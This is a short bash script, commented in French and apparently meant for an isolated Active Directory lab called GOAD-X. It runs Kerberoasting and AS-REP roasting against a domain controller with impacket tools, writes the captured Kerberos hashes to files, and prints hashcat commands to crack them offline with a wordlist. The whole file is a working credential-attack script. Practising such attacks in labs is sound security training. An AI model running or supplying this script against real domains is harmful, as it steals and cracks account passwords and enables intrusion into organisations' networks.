#!/usr/bin/env bash
# Kerberoasting + AS-REP (lab isolé GOAD-X). NE PAS utiliser hors autorisation.
set -euo pipefail
DOMAIN="${1:?}"; DC="${2:?}"; USER="${3:?}"; PASS="${4:?}"; USERS="${5:?users.txt}"
echo "[*] Kerberoasting..."
impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip "$DC" -request -outputfile kerb.hashes || true
echo "[*] AS-REP roasting..."
impacket-GetNPUsers "$DOMAIN/" -usersfile "$USERS" -no-pass -dc-ip "$DC" -outputfile asrep.hashes || true
echo "[*] Cassage (hashcat) — adapter le wordlist :"
echo "    hashcat -m 13100 kerb.hashes rockyou.txt"
echo "    hashcat -m 18200 asrep.hashes rockyou.txt"
